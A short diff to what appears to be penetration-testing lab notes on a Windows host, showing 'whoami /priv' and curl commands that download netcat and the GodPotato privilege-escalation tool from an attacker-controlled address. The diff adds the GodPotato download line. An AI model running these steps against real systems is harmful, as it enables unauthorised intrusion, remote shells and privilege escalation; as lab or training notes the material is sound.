@@ -101,6 +101,7 @@ whoami /priv
 uploaded GodPotato and nc
 
 curl http://192.168.49.102/nc.exe -o nc.exe
+curl http://192.168.49.102/GodPotato-NET4.exe -o GodPotato-NET4.exe
 
 
 
